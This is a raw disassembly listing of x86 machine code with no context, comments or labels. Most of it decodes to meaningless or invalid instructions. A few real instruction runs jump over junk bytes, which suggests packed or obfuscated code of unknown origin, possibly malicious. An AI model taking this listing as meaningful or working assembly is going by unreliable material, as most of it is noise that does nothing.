  402811:	out    dx,eax
  402812:	mov    al,ds:0x90c011d6
  402817:	or     al,0x1c
  402819:	pop    ebx
  40281a:	cmc    
  40281b:	add    al,0xaa
  40281d:	imul   esi,edx,0x689cd81f
  402823:	shl    DWORD PTR [ecx-0x3d],0x48
  402827:	add    eax,0x336db35c
  40282c:	or     ebp,edi
  40282e:	call   0xe3fa:0x5a78d9f0
  402835:	fcomp  st(5)
  402837:	cmp    dh,BYTE PTR [edi]
  402839:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40283a:	(bad)  
  40283b:	js     0x402879
  40283d:	das    
  40283e:	add    al,BYTE PTR [ecx]
  402840:	mov    dl,0xad
  402842:	pop    cx
  402844:	ins    DWORD PTR es:[edi],dx
  402845:	lods   al,BYTE PTR ds:[esi]
  402846:	push   edi
  402847:	pop    edx
  402848:	mov    ecx,0xe4c3d991
  40284d:	dec    ebx
  40284e:	pop    ebx
  40284f:	pop    ebp
  402850:	fdiv   DWORD PTR [edx+esi*1-0x19]
  402854:	rol    DWORD PTR [ebp+0x665cfcb4],0x43
  40285b:	jne    0x4028cf
  40285d:	jp     0x402883
  40285f:	mov    eax,ds:0xd260be7c
  402864:	lods   al,BYTE PTR ds:[esi]
  402865:	(bad)  
  402866:	jmp    0x40293e
  40286b:	cs mov ch,0x9b
  40286e:	jmp    0x40280b
  402870:	out    dx,eax
  402871:	jle    0x402868
  402873:	in     al,dx
  402874:	xor    BYTE PTR [ebp-0x6549926b],bh
  40287a:	mov    edi,0x693
  40287f:	mov    ebx,0x5a000000
  402884:	jecxz  0x40280e
  402886:	inc    eax
  402887:	lds    esi,FWORD PTR [edx-0x7d]
  40288a:	push   esi
  40288b:	lods   al,BYTE PTR ds:[esi]
  40288c:	sub    eax,0x94d81f82
  402891:	xor    ecx,ebp
  402893:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402894:	mov    al,0xc6
  402896:	dec    edi
  402897:	mov    ds:0xcb991569,eax
  40289c:	mov    al,ds:0x116e297b
  4028a1:	mov    ch,0x24
  4028a3:	(bad)  
  4028a5:	and    BYTE PTR [edi+0x51d5ec0],ah
  4028ab:	popf   
  4028ac:	stos   DWORD PTR es:[edi],eax
  4028ad:	gs ins BYTE PTR es:[edi],dx
  4028af:	xchg   ebp,eax
  4028b0:	shl    BYTE PTR [eax+ebx*2+0x3ec48c65],cl
  4028b7:	inc    ebp
  4028b8:	sbb    cl,BYTE PTR [esi+0x50]
  4028bb:	imul   BYTE PTR [edx]
  4028bd:	mov    WORD PTR [eax],ds
  4028bf:	arpl   WORD PTR [ecx],ax
  4028c1:	mov    bh,0x49
  4028c3:	es mov edx,0x801e0509
  4028c9:	inc    esi
  4028ca:	(bad)  
  4028cb:	mov    eax,ds:0x49ebef89
  4028d0:	and    BYTE PTR [ebp-0x20],al
  4028d3:	fbld   TBYTE PTR [ecx+0x6a]
  4028d6:	imul   ecx,DWORD PTR [ebx-0x21e9b609],0x33760811
  4028e0:	cmc    
  4028e1:	inc    edx
  4028e2:	fild   QWORD PTR [edi-0x137c9dd1]
  4028e8:	sbb    edx,eax
  4028ea:	lea    esi,[esi-0x4aa16f9c]
  4028f0:	(bad)  
  4028f2:	push   cs
  4028f3:	loope  0x402941
  4028f5:	adc    dl,BYTE PTR [esi+esi*8]
  4028f8:	add    eax,0x2b0e78ca
  4028fd:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4028ff:	ret    0xad85
  402902:	and    al,0xe4
  402904:	std    
  402905:	sub    eax,0x1c2cb77a
  40290a:	and    DWORD PTR [ebx+0x5a210a57],edx
  402910:	dec    esi
  402912:	mov    eax,ds:0xda778ec8
  402917:	mov    eax,ds:0x58ac6187
  40291c:	(bad)  
  40291d:	pusha  
  40291e:	popa   
  40291f:	dec    edx
  402920:	cmp    eax,0xd424d675
  402925:	mov    esp,0x83406cb6
  40292a:	in     al,0x4d
  40292c:	out    0xfa,al
  40292e:	imul   DWORD PTR ds:0x381f9033
  402934:	mov    al,ds:0x6e545b08
  402939:	sbb    BYTE PTR [ecx-0x764fff62],bh
  40293f:	inc    ebp
  402940:	clc    
  402941:	xor    DWORD PTR ds:0x433670,ebx
  402947:	mov    eax,DWORD PTR [ebp+0x20]
  40294a:	jmp    0x402a22
  40294f:	mov    ds:0x7f8c7fdc,al
  402954:	scas   eax,DWORD PTR es:[edi]
  402955:	repz (bad) 
  402957:	adc    eax,DWORD PTR [ecx]
  402959:	jg     0x4029ba
  40295b:	lods   al,BYTE PTR ds:[esi]
  40295c:	and    al,0xa4
  40295e:	or     eax,0x74e
  402963:	mov    ebx,0x70000000
  402968:	dec    esi
  402969:	xchg   ebp,eax
  40296a:	div    DWORD PTR [ebx+0x39]
  40296d:	sbb    DWORD PTR [ecx-0x1ab094ba],0x6c
  402974:	jecxz  0x402937
  402976:	gs retf 
  402978:	push   ebp
  402979:	cwde   
  40297a:	pusha  
  40297b:	das    
  40297c:	ror    bl,1
  40297e:	loope  0x402961
  402980:	xor    al,0x8e
  402982:	push   ss
  402983:	popw   es
  402985:	push   ds
  402986:	xchg   DWORD PTR [edi-0xe0b62e2],edx
  40298c:	push   cs
  40298d:	adc    eax,0x5a957998
  402992:	jbe    0x402929
  402994:	or     dh,al
  402996:	xor    bl,ch
  402998:	aam    0xc
  40299a:	clc    
  40299b:	mov    cl,0xc8
  40299d:	inc    ebx
  40299e:	fs jo  0x4029a0
  4029a1:	add    al,bh
  4029a3:	sbb    DWORD PTR [edi-0x2270e104],eax
  4029a9:	fucomp st(4)
  4029ab:	dec    esi
  4029ac:	fsubr  DWORD PTR [eax-0x15afa4b3]
  4029b2:	cmc    
  4029b3:	repz inc edi
  4029b5:	adc    al,0x8
  4029b7:	cmp    BYTE PTR [ecx-0x2d],ch
  4029ba:	jecxz  0x4029b5
  4029bc:	push   esp
  4029bd:	lahf   
  4029be:	ja     0x402a05
  4029c0:	in     al,0xa4
  4029c2:	call   0x6e241a21
  4029c7:	or     al,bh
  4029c9:	adc    ch,cl
  4029cb:	xor    eax,0x801bd498
  4029d0:	dec    ecx
  4029d1:	cld    
  4029d2:	jns    0x40298a
  4029d4:	aad    0x64
  4029d6:	ret    
  4029d7:	pop    esi
  4029d8:	adc    BYTE PTR [eax],0x90
  4029db:	icebp  
  4029dc:	adc    DWORD PTR [esi+0x76430afd],0x4f3cf2ea
  4029e6:	sub    al,0x5d
  4029e8:	jns    0x4029c3
  4029ea:	out    dx,eax
  4029eb:	scas   al,BYTE PTR es:[edi]
  4029ec:	xchg   ebx,eax
  4029ed:	jne    0x402978
  4029ef:	push   ebp
  4029f0:	pushf  
  4029f1:	ror    DWORD PTR [ecx],0x3d
  4029f4:	dec    ebp
  4029f5:	cld    
  4029f6:	and    bl,BYTE PTR ds:0x72c4a1e4
  4029fc:	sbb    edi,ebx
  4029fe:	push   ds
  4029ff:	pushf  
  402a00:	xlat   BYTE PTR ds:[ebx]
  402a01:	pop    es
  402a02:	into   
  402a03:	dec    ebx
  402a04:	int3   
  402a05:	dec    eax
  402a06:	jg     0x4029d4
  402a08:	icebp  
  402a09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a0b:	mov    dh,0x9d
  402a0d:	icebp  
  402a0e:	mov    al,0x42
  402a10:	daa    
  402a11:	(bad)  
  402a12:	jge    0x402a6c
  402a14:	iret   
  402a15:	or     eax,0xb3cfae9b
  402a1a:	xchg   esi,eax
  402a1b:	imul   ecx,esp,0x32
  402a1e:	mov    dh,dh
  402a20:	js     0x402a8a
  402a22:	mov    ecx,DWORD PTR [ebp+0x24]
  402a25:	sub    DWORD PTR ds:0x433648,0x4e29
  402a2f:	xor    eax,esi
  402a31:	xor    ebx,DWORD PTR ds:0x433644
  402a37:	mov    ebx,0x66479db3
  402a3c:	sub    DWORD PTR ds:0x433648,0x26fa
  402a46:	sub    eax,ebx
  402a48:	or     DWORD PTR ds:0x433618,0x4335b4
  402a52:	jmp    0x402b2a
  402a57:	xchg   edi,eax
  402a58:	inc    edx
  402a59:	imul   ecx,DWORD PTR [edx-0x3],0xc1dfb76b
  402a60:	lea    edi,[ebx]
  402a62:	ret    
  402a63:	inc    ebx
  402a64:	mov    al,0xf6
  402a66:	pop    edi
  402a67:	or     DWORD PTR [eax],ecx
  402a69:	add    BYTE PTR [eax],al
  402a6b:	mov    ebx,0x9b000000
  402a70:	mov    dl,0x89
  402a72:	mov    BYTE PTR [esi+0x12],dh
  402a75:	mov    eax,ds:0xcef18e1d
  402a7a:	dec    ebx
  402a7b:	xchg   esp,eax
  402a7c:	cmp    al,0x81
  402a7e:	dec    edx
  402a7f:	add    eax,edx
  402a81:	(bad)  
  402a82:	mov    dl,0xc5
  402a84:	imul   ebx,DWORD PTR [ecx+0x7],0xb6a62fa5
  402a8b:	push   ebx
  402a8c:	mov    edx,0x15d70371
  402a91:	aaa    
  402a92:	jg     0x402b06
  402a94:	mov    eax,esi
  402a96:	push   edi
  402a97:	nop
  402a98:	lea    eax,[ebp-0x77]
  402a9b:	jg     0x402b12
  402a9d:	push   esi
  402a9e:	xor    eax,0xf42110e8
  402aa3:	mov    bh,0xf6
  402aa5:	sub    eax,DWORD PTR [ebp+0x4f]
  402aa8:	outs   dx,DWORD PTR ds:[esi]
  402aa9:	and    ch,bh
  402aab:	js     0x402aae
  402aad:	and    dl,dl
  402aaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ab0:	dec    eax
  402ab1:	cld    
  402ab2:	cmc    
  402ab3:	push   0xffffffd3
  402ab5:	das    
  402ab6:	iret   
  402ab7:	xchg   ebx,eax
  402ab8:	sub    eax,0xaa61a23e
  402abd:	cmp    al,0x22
  402abf:	mov    al,0x1
  402ac1:	push   cs
  402ac2:	inc    edx
  402ac3:	call   DWORD PTR [esi]
  402ac5:	mov    edi,0xe33f4f8d
  402aca:	mov    dl,BYTE PTR [eax]
  402acc:	dec    esp
  402acd:	pop    ecx
  402ace:	adc    DWORD PTR [edi-0x5b],ecx
  402ad1:	ds mov ebp,0xa76d71be
  402ad7:	inc    esp
  402ad8:	jbe    0x402a7c
  402ada:	ins    BYTE PTR es:[edi],dx
  402adb:	xor    dl,BYTE PTR [eax-0x4987f8a4]
  402ae1:	mov    edx,0x1be7704
  402ae6:	mov    BYTE PTR [ebp-0x4d],bh
  402ae9:	mov    ch,0xbd
  402aeb:	add    dl,BYTE PTR [ebp+esi*4+0x3bec59f9]
  402af2:	mov    ebx,0x9cae473c
  402af7:	in     al,dx
  402af8:	cwde   
  402af9:	mov    al,0x0
  402afb:	(bad)  
  402afc:	out    0x59,al
  402afe:	retf   
  402aff:	inc    eax
  402b00:	inc    edi
  402b01:	mov    esp,0x63a28d86
  402b06:	fwait
  402b07:	pop    ebx
  402b08:	ins    BYTE PTR es:[edi],dx
  402b09:	lgs    edi,FWORD PTR [esi-0x52]
  402b0d:	pop    ebx
  402b0e:	xor    DWORD PTR [ebx+0x44],edi
  402b11:	test   DWORD PTR [ebx+0x6b],esi
  402b14:	bnd jns 0x402b55
  402b17:	sub    al,0xbd
  402b19:	or     DWORD PTR [ecx],ebp
  402b1b:	xor    eax,0x5e71a917
  402b20:	xor    esp,edx
  402b22:	sub    al,0x67
  402b24:	sbb    al,0x37
  402b26:	out    dx,eax
  402b27:	adc    dh,dh
  402b29:	lea    ecx,[ecx+0x3d83d445]
  402b2f:	in     al,dx
  402b30:	xor    eax,0xf000043
  402b35:	lea    ebx,[ebx]
  402b37:	add    BYTE PTR [eax],al
  402b39:	add    cl,ch
  402b3b:	push   ss
  402b3c:	add    BYTE PTR [eax],al
  402b3e:	add    bh,bh
  402b40:	jne    0x402b32
  402b42:	push   DWORD PTR [ebp-0x1c]
  402b45:	push   0x2d8d
  402b4a:	push   0x2fe9
  402b4f:	call   DWORD PTR ds:0x43c7fc
  402b55:	mov    DWORD PTR [ebp-0x60],0x5b40
  402b5c:	jmp    0x402c34
  402b61:	push   eax
  402b63:	xchg   ecx,eax
  402b64:	xchg   DWORD PTR [edi+0x44f8ffe7],ebx
  402b6a:	push   0x68259f38
  402b6f:	mov    ah,0x6d
  402b71:	les    ecx,FWORD PTR [eax]
  402b73:	add    BYTE PTR [eax],al
  402b75:	mov    ebx,0x8000000
  402b7a:	jl     0x402b0b
  402b7c:	and    eax,0x848bb602
  402b81:	(bad)  
  402b82:	ss in  eax,dx
  402b84:	push   ebp
  402b85:	jmp    0x9366620e
  402b8a:	in     eax,0xb0
  402b8c:	test   ebp,0xf309ca25
  402b92:	test   DWORD PTR [edi],esi
  402b94:	and    DWORD PTR [esi-0x65],ebx
  402b97:	gs dec edi
  402b99:	and    eax,0x9efd2d55
  402b9e:	lea    esp,ds:0x6e9e15c3
  402ba4:	aad    0xe1
  402ba6:	pop    esi
  402ba7:	jae    0x402b4d
  402ba9:	add    eax,0xe44b4682
  402bae:	mov    cl,0x6d
  402bb0:	push   esi
  402bb1:	inc    ebx
  402bb2:	pop    ss
  402bb3:	sub    al,0xf5
  402bb5:	fwait
  402bb6:	std    
  402bb7:	cmp    BYTE PTR [ebx+0xd12d2],cl
  402bbd:	push   0x14293f73
  402bc2:	push   0x3611eb43
  402bc7:	arpl   WORD PTR [edx-0x286c2356],ax
  402bcd:	and    edx,DWORD PTR [edx]
  402bcf:	ja     0x402bb6
  402bd1:	retf   0xc0a3
  402bd4:	adc    ah,BYTE PTR [esi]
  402bd6:	aas    
  402bd7:	call   0xd6173857
  402bdc:	dec    ebx
  402bdd:	enter  0xd559,0x5d
  402be1:	sbb    BYTE PTR [ebx+0x2b],dl
  402be4:	sbb    DWORD PTR [esi],0x3a
  402be7:	xor    al,0xb1
  402be9:	dec    esi
  402bea:	enter  0x88cb,0xaf
  402bee:	in     al,0x38
  402bf0:	pop    ss
  402bf1:	in     eax,dx
  402bf2:	fwait
  402bf3:	imul   edi,edi,0x8303c4d8
  402bf9:	sti    
  402bfa:	dec    edi
  402bfb:	push   edi
  402bfc:	pusha  
  402bfd:	adc    BYTE PTR [ecx+0x138977fd],cl
  402c03:	mov    ebx,0xec3732f0
  402c08:	mov    al,ds:0x97e31ca9
  402c0d:	ret    
  402c0e:	and    al,0x29
  402c10:	fs std 
  402c12:	fst    DWORD PTR [eax-0x1edcbbff]
  402c18:	mov    eax,DWORD PTR [bx+di-0x3b]
  402c1c:	pop    ss
  402c1d:	mov    eax,0xdd16212a
  402c22:	jns    0x402c18
  402c24:	cld    
  402c25:	outs   dx,BYTE PTR ds:[esi]
  402c26:	cmc    
  402c27:	sbb    cl,BYTE PTR [edi]
  402c29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c2a:	(bad)  
  402c2b:	mov    bh,0x9c
  402c2d:	adc    DWORD PTR [edi],ebp
  402c2f:	ja     0x402bf2
  402c31:	(bad)  
  402c32:	mov    WORD PTR gs:[ebp-0x5c],0x1548
  402c39:	add    BYTE PTR [eax],al
  402c3b:	mov    DWORD PTR [ebp-0x60],0x6661
  402c42:	jmp    0x402d1a
  402c47:	hlt    
  402c48:	adc    al,al
  402c4a:	xor    esp,esp
  402c4c:	icebp  
  402c4d:	cmc    
  402c4e:	aad    0x69
  402c50:	cld    
  402c51:	ja     0x402cb2
  402c53:	and    ah,BYTE PTR [ebp+0x5]
  402c56:	xor    edi,DWORD PTR [edi+0x9]
  402c59:	add    BYTE PTR [eax],al
  402c5b:	mov    ebx,0x3d000000
  402c60:	mov    dl,0x50
  402c62:	mov    ch,0x2f
  402c64:	retf   
  402c65:	ins    BYTE PTR es:[edi],dx
  402c66:	add    eax,0x4416c157
  402c6b:	sub    al,0x84
  402c6d:	and    ah,bl
  402c6f:	sbb    DWORD PTR [edx+0x557cddb8],0x6f
  402c76:	add    eax,0x3347bb4f
  402c7b:	xor    eax,0x6a8ae6a3
  402c80:	push   edx
  402c81:	test   al,0xde
  402c83:	icebp  
  402c84:	pop    ecx
  402c85:	jb     0x402c3e
  402c87:	aad    0xd0
  402c89:	add    al,0x76
  402c8b:	mov    dh,0x91
  402c8d:	outs   dx,BYTE PTR ds:[esi]
  402c8e:	pop    ebx
  402c8f:	sub    BYTE PTR [edx+0x20],0xec
  402c93:	sub    al,0x92
  402c95:	jnp    0x402c99
  402c97:	sub    eax,0xdc0ddb55
  402c9c:	lods   eax,DWORD PTR ds:[esi]
  402c9d:	test   BYTE PTR [esi],0xaf
  402ca0:	ins    BYTE PTR es:[edi],dx
  402ca1:	add    ecx,DWORD PTR [edx+esi*8]
  402ca4:	fcmovb st,st(6)
  402ca6:	dec    esi
  402ca7:	inc    ebp
  402ca8:	repnz jecxz 0x402c47
  402cab:	sbb    eax,0xce8b1337
  402cb0:	jl     0x402c82
  402cb2:	adc    bh,dl
  402cb4:	daa    
  402cb5:	cmp    eax,0xfa8343d0
  402cba:	cmp    eax,0x2fda08f6
  402cbf:	cmp    DWORD PTR [ebp+0x38efd4e4],esp
  402cc5:	mov    eax,ds:0x354009a9
  402cca:	inc    esp
  402ccb:	repz adc ch,cl
  402cce:	in     al,0x0
  402cd0:	pop    esp
  402cd1:	cmp    DWORD PTR [ebp-0x1214dddd],esp
  402cd7:	add    ecx,edx
  402cd9:	in     al,0x14
  402cdb:	pop    edx
  402cdc:	js     0x402d39
  402cde:	dec    edi
  402cdf:	mov    edi,0x744d7589
  402ce4:	ins    BYTE PTR es:[edi],dx
  402ce5:	stos   BYTE PTR es:[edi],al
  402ce6:	and    BYTE PTR [eax-0x61d39f09],ah
  402cec:	loop   0x402d04
  402cee:	scas   al,BYTE PTR es:[edi]
  402cef:	pop    es
  402cf0:	xchg   edi,eax
  402cf1:	xchg   edx,eax
  402cf2:	jne    0x402d05
  402cf4:	mov    cl,0xba
  402cf6:	inc    edi
  402cf7:	jne    0x402cea
  402cf9:	sub    BYTE PTR [ebp+ebp*8+0x4cb644fd],bl
  402d00:	loope  0x402d0c
  402d02:	(bad)
  402d05:	inc    edx
  402d06:	pop    ebx
  402d07:	mov    esi,0xc3205286
  402d0c:	add    bh,al
  402d0e:	dec    edx
  402d0f:	mov    dl,0x42
  402d11:	dec    bh
  402d13:	daa    
  402d14:	push   edx
  402d15:	add    al,BYTE PTR [esp+edi*2+0x3e]
  402d19:	inc    edx
  402d1a:	mov    DWORD PTR [ebp-0x5c],0x6dfc
  402d21:	mov    DWORD PTR [ebp-0x60],0x9ce
  402d28:	jmp    0x402e00
  402d2d:	test   al,0x2a
  402d2f:	call   FWORD PTR [ebp-0x1]
  402d32:	(bad)  [edx+0x415497ff]
  402d38:	pop    ecx
  402d39:	mov    cl,0x14
  402d3b:	(bad)  
  402d3c:	mov    eax,ds:0xa3a
  402d41:	mov    ebx,0x69000000
  402d46:	xor    DWORD PTR [ebx+ebx*8+0x2e],ecx
  402d4a:	sbb    al,al
  402d4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d4d:	or     DWORD PTR [edi+edi*4],ecx
  402d50:	fdiv   DWORD PTR [eax-0x1914c8ff]
  402d56:	mov    ?,WORD PTR [edx]
  402d58:	jmp    0x115e:0x1bd9bb6e
  402d5f:	imul   esp,DWORD PTR [ecx],0x83eb7291
  402d65:	add    al,0xe7
  402d67:	(bad)  
  402d68:	mov    ebp,DWORD PTR [edi]
  402d6a:	aas    
  402d6b:	hlt    
  402d6c:	jmp    0x402d33
  402d6e:	pop    ds
  402d6f:	enter  0x871d,0x9d
  402d73:	enter  0x6ab9,0xd0
  402d77:	neg    DWORD PTR [eax-0x78]
  402d7a:	ds add eax,0xe32f3ae
  402d80:	aaa    
  402d81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d82:	sar    BYTE PTR [esi],0x47
  402d85:	push   ebx
  402d86:	or     al,0x30
  402d88:	mov    ah,0xc7
  402d8a:	stos   DWORD PTR es:[edi],eax
  402d8b:	sbb    eax,0xbb5776b
  402d90:	mov    al,ds:0x3088af0e
  402d95:	cld    
  402d96:	inc    esp
  402d97:	ja     0x402d78
  402d99:	je     0x402d74
  402d9b:	out    dx,eax
  402d9c:	and    edx,DWORD PTR [ebx-0x96ef143]
  402da2:	mov    esi,0x53dd45a0
  402da7:	mov    ecx,0x59502c88
  402dac:	imul   ebp,DWORD PTR [ecx],0xddf05c48
  402db2:	jns    0x402dde
  402db4:	push   ebx
  402db5:	mov    esi,0x825ee352
  402dba:	pop    ebp
  402dbb:	retf   0x1c5d
  402dbe:	add    al,0x96
  402dc0:	js     0x402dbf
  402dc2:	scas   eax,DWORD PTR es:[edi]
  402dc3:	mov    cl,0xb1
  402dc5:	adc    BYTE PTR [ecx-0x1e377645],dh
  402dcb:	loop   0x402d5c
  402dcd:	xchg   DWORD PTR [eax],ebp
  402dcf:	ret    0x6750
  402dd2:	test   DWORD PTR [ecx],edi
  402dd4:	into   
  402dd5:	dec    ecx
  402dd6:	into   
  402dd7:	nop
  402dd8:	aas    
  402dd9:	in     al,0x1e
  402ddb:	mov    ebp,0xcc186d64
  402de0:	pop    ecx
  402de1:	mov    ds:0x7e612376,al
  402de6:	and    DWORD PTR [esi-0xc1c3f10],0xc111f1fe
  402df0:	cmp    eax,0x2f9a8b3
  402df5:	es daa 
  402df7:	adc    dl,BYTE PTR [esi+0x2e]
  402dfa:	sub    BYTE PTR [ebx-0x53b0b1a1],0xc7
  402e01:	inc    ebp
  402e02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e03:	inc    ebx
  402e04:	push   edi
  402e05:	add    BYTE PTR [eax],al
  402e07:	jmp    0x402edf
  402e0c:	cmp    bh,bh
  402e0e:	shl    al,cl
  402e10:	xlat   BYTE PTR ds:[ebx]
  402e11:	std    
  402e12:	cmp    bh,bh
  402e14:	push   ds
  402e15:	pop    eax
  402e16:	lea    esi,[ebx]
  402e18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e19:	or     dh,BYTE PTR [ecx+0xd]
  402e1c:	cmc    
  402e1d:	or     al,BYTE PTR [eax]
  402e1f:	add    BYTE PTR [ebx-0x49000000],bh
  402e25:	loop   0x402de9
  402e27:	push   esp
  402e28:	adc    ah,BYTE PTR [esi]
  402e2a:	dec    esi
  402e2b:	int3   
  402e2c:	lahf   
  402e2d:	daa    
  402e2e:	js     0x402e79
  402e30:	inc    eax
  402e31:	xchg   BYTE PTR [ebp-0x5d84e1a9],ch
  402e37:	xchg   dl,al
  402e39:	sbb    al,0xd9
  402e3b:	mov    eax,ds:0x518908f8
  402e40:	sbb    al,0xfe
  402e42:	mov    al,ds:0x943691a8
  402e47:	cld    
  402e48:	add    BYTE PTR [esi+ebx*8-0x48b74d13],ah
  402e4f:	jb     0x402e51
  402e51:	add    BYTE PTR [edx+0x47],dh
  402e54:	dec    ebx
  402e55:	sbb    eax,0x8f9a08b1
  402e5a:	sbb    DWORD PTR [ebp+eiz*1+0x32ec5056],esp
  402e61:	jo     0x402eb9
  402e63:	shl    cl,cl
  402e65:	jmp    0x34f4:0xb1b70792
  402e6c:	xor    al,0x7d
  402e6e:	push   edi
  402e6f:	scas   eax,DWORD PTR es:[edi]
  402e70:	gs leave 
  402e72:	xor    dl,dl
  402e74:	cmp    bl,BYTE PTR [ebp-0x9609933]
  402e7a:	data16 xor cl,BYTE PTR [esi-0x1a030b94]
  402e81:	popa   
  402e82:	sbb    ah,BYTE PTR ds:0xaa627b2f
  402e88:	sbb    al,0x96
  402e8a:	cdq    
  402e8b:	pop    eax
  402e8c:	cs loopne 0x402ec8
  402e8f:	pop    edi
  402e90:	daa    
  402e91:	lods   al,BYTE PTR ds:[esi]
  402e92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e93:	fwait
  402e94:	mov    eax,0x156a7e7a
  402e99:	imul   ebx,ebx,0x6a258bc8
  402e9f:	into   
  402ea0:	sar    DWORD PTR [ebp+edi*2-0x5c],cl
  402ea4:	test   al,0x37
  402ea6:	xchg   BYTE PTR [eax+0x34],dl
  402ea9:	xor    edi,DWORD PTR [ebp-0x43]
  402eac:	in     al,dx
  402ead:	inc    edi
  402eae:	sub    ah,bl
  402eb0:	(bad)  
  402eb1:	call   0xb4b95f1e
  402eb6:	xor    edi,DWORD PTR [esi]
  402eb8:	xchg   edx,eax
  402eb9:	cmp    al,0xd1
  402ebb:	rcl    DWORD PTR ds:0x1ad8cd5d,1
  402ec1:	or     eax,0x8c53c040
  402ec6:	mov    ch,0x18
  402ec8:	ret    0x64c6
  402ecb:	aaa    
  402ecc:	in     al,0x62
  402ece:	xchg   ebx,eax
  402ecf:	ds push ebx
  402ed1:	mov    DWORD PTR [ebx-0x33d71d06],ebp
  402ed7:	pusha  
  402ed8:	fwait
  402ed9:	mov    dh,0xa
  402edb:	add    BYTE PTR [esi-0x7b],bh
  402ede:	lock mov DWORD PTR [ebp-0x60],0x48b3
  402ee6:	add    eax,eax
  402ee8:	mov    DWORD PTR [ebp-0x5c],0x6dc8
  402eef:	sub    eax,0x5c66
  402ef4:	mov    DWORD PTR [ebp-0x60],0x42d7
  402efb:	sub    DWORD PTR ds:0x4335dc,0x220c
  402f05:	jmp    0x402fdd
  402f0a:	cdq    
  402f0b:	xchg   esp,eax
  402f0c:	inc    esi
  402f0d:	sub    cl,BYTE PTR [edi-0x6]
  402f10:	std    
  402f11:	mov    bh,0x1a
  402f13:	pop    ecx
  402f14:	mov    eax,0x5c42a002
  402f19:	ret    
  402f1a:	mov    al,0xb
  402f1c:	add    BYTE PTR [eax],al
  402f1e:	mov    ebx,0x1e000000
  402f23:	xchg   ebp,eax
  402f24:	out    dx,eax
  402f25:	dec    ebp
  402f26:	mov    ebp,ebp
  402f28:	sbb    dl,dl
  402f2a:	pop    ebx
  402f2b:	pop    eax
  402f2c:	inc    ecx
  402f2d:	std    
  402f2e:	and    BYTE PTR [eax],ah
  402f30:	ja     0x402f56
  402f32:	sub    dl,ch
  402f34:	jmp    0x402f3d
  402f36:	xor    ecx,DWORD PTR [esi+ebp*1]
  402f39:	not    cl
  402f3b:	push   ebx
  402f3c:	or     al,0x6
  402f3e:	jle    0x402fa9
  402f40:	xchg   al,ch
  402f42:	mov    WORD PTR [edx+0x57],?
  402f45:	pushf  
  402f46:	cmp    esp,DWORD PTR cs:[edi+0x1bca363c]
  402f4d:	push   edi
  402f4e:	mov    dh,0x79
  402f50:	shl    BYTE PTR [edx-0x1843d90],0xad
  402f57:	pusha  
  402f58:	adc    eax,ebx
  402f5a:	mov    DWORD PTR [ebx],ebp
  402f5c:	out    dx,eax
  402f5d:	in     al,0x48
  402f5f:	test   DWORD PTR [eax+0x8],0xbc000498
  402f66:	lock retf 0xc973
  402f6a:	aad    0x58
  402f6c:	ds xchg ebp,eax
  402f6e:	add    al,0x81
  402f70:	stos   DWORD PTR es:[edi],eax
  402f71:	mov    ds:0xfc20a943,eax
  402f76:	cmp    DWORD PTR [ebx-0x22],ebx
  402f79:	lds    eax,FWORD PTR [edx-0x4faaa920]
  402f7f:	test   BYTE PTR [edx],dh
  402f81:	dec    edx
  402f82:	inc    edi
  402f83:	fwait
  402f84:	lds    edx,FWORD PTR [ebp+0x10dcd2f0]
  402f8a:	aam    0x5b
  402f8c:	stc    
  402f8d:	mov    ebp,0x68262f44
  402f92:	aaa    
  402f93:	in     eax,0x69
  402f95:	arpl   WORD PTR [edx+0x3a],bx
  402f98:	lahf   
  402f99:	fst    QWORD PTR [edx]
  402f9b:	push   eax
  402f9c:	and    edx,DWORD PTR [eax]
  402f9e:	dec    edi
  402f9f:	inc    ecx
  402fa0:	mov    ds:0xbb7a4622,eax
  402fa5:	in     eax,0xc1
  402fa7:	in     al,0x74
  402fa9:	and    ecx,ebp
  402fab:	ror    BYTE PTR [ecx+edi*2-0x184991ae],1
  402fb2:	add    al,0xbd
  402fb4:	and    DWORD PTR ds:0x1c5b50b0,esi
  402fba:	jae    0x40302f
  402fbc:	int3   
  402fbd:	dec    ebx
  402fbe:	aas    
  402fbf:	inc    ebx
  402fc0:	hlt    
  402fc1:	in     al,dx
  402fc2:	lods   eax,DWORD PTR ds:[esi]
  402fc3:	mov    ecx,DWORD PTR [esi+0x5f2f087d]
  402fc9:	mov    WORD PTR [eax],ds
  402fcb:	clc    
  402fcc:	loopne 0x402f7b
  402fce:	(bad)  [esi-0x2868cf0a]
  402fd4:	push   ebx
  402fd5:	pop    ecx
  402fd6:	clc    
  402fd7:	fnsave [ecx-0x3528ac84]
  402fdd:	mov    DWORD PTR [ebp-0x5c],0x3322
  402fe4:	mov    ecx,DWORD PTR ds:0x43000c
  402fea:	mov    ecx,DWORD PTR [ecx]
  402fec:	sbb    DWORD PTR ds:0x433620,ecx
  402ff2:	mov    DWORD PTR [ebp-0x58],0x7a69
  402ff9:	mov    DWORD PTR [ebp-0x54],0x5d39
  403000:	cmp    DWORD PTR ds:0x433540,0x0
  403007:	jbe    0x403021
  40300d:	add    ecx,ecx
  40300f:	not    eax
  403011:	jmp    0x403021
  403016:	push   0x8b9c
  40301b:	call   DWORD PTR ds:0x43c820
  403021:	mov    DWORD PTR [ebp-0x50],0x9e79e889
  403028:	push   0x3
  40302a:	pop    eax
  40302b:	jmp    0x403103
  403030:	push   0xca1e48e2
  403035:	mov    esi,0xf341f67e
  40303a:	push   ebp
  40303b:	in     al,0xe6
  40303d:	jb     0x403038
  40303f:	fisubr WORD PTR [ebx+0xc]
  403042:	add    BYTE PTR [eax],al
  403044:	mov    ebx,0x3e000000
  403049:	fld    TBYTE PTR [eax]
  40304b:	in     eax,dx
  40304c:	sbb    al,BYTE PTR [eax]
  40304e:	mov    eax,ds:0x2371267d
  403053:	scas   al,BYTE PTR es:[edi]
  403054:	xchg   edx,eax
  403055:	mov    edx,0x61c6c947
